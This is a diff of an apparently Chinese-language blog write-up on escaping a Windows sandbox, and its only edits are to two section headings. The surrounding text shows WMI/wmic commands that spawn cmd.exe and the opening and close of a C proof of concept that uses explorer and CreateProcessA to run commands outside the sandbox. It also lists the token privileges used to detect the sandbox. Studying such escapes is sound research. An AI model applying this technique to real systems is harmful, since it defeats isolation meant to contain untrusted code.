@@ -520,7 +520,7 @@ wmic process call create cmd
 # vbs script , wscript xx.vbs / xx.vbs 对象调用
 INT GetObject("winmgmts:Win32_Process").Create("cmd.exe",null,null,null)</code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/4c3c72f6191b8ba1b15a4b82c894bde0.png"><br>这种方式与<code>msiexec</code>方式获得的权限一致。</p>
-<h2 id="0x04-概念验证程序的实现"><a href="#0x04-概念验证程序的实现" class="headerlink" title="0x04 概念验证程序的实现"></a>0x04 概念验证程序的实现</h2><p>通过以上测试，选择explorer作为逃逸的利用程序。编写POC进行验证，主要使用CreateProcessA创建进程获得沙箱外的命令执行：</p>
+<h2 id="0x04-概念验证实现"><a href="#0x04-概念验证实现" class="headerlink" title="0x04 概念验证实现"></a>0x04 概念验证实现</h2><p>通过以上测试，选择explorer作为逃逸的利用程序。编写POC进行验证，主要使用CreateProcessA创建进程获得沙箱外的命令执行：</p>
 <pre><code class="line-numbers language-c">#include &lt;windows.h&gt;
 #include &lt;stdio.h&gt;
 int main(int argc, char* argv[])
@@ -539,7 +539,7 @@ int main(int argc, char* argv[])
     return 0;
 }</code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/bb221cf3bc2e138ca653934b507e6295.png"><br>程序执行后通过explorer执行powershell，成功获得了完整特权下的沙箱逃逸。</p>
-<h2 id="0x05-利用程序实现"><a href="#0x05-利用程序实现" class="headerlink" title="0x05 利用程序实现"></a>0x05 利用程序实现</h2><p>在漏洞利用程序<code>EXP</code>中可以通过检测当前<code>Token</code>中启用的特权判断是否在沙箱环境中，已知的沙箱环境中<code>Token</code>特权为：</p>
+<h2 id="0x05-漏洞利用实现"><a href="#0x05-漏洞利用实现" class="headerlink" title="0x05 漏洞利用实现"></a>0x05 漏洞利用实现</h2><p>在漏洞利用程序<code>EXP</code>中可以通过检测当前<code>Token</code>中启用的特权判断是否在沙箱环境中，已知的沙箱环境中<code>Token</code>特权为：</p>
 <pre><code>SeChangeNotifyPrivilege       绕过遍历检查         已启用
 SeUndockPrivilege             从扩展坞上取下计算机 已禁用
 SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
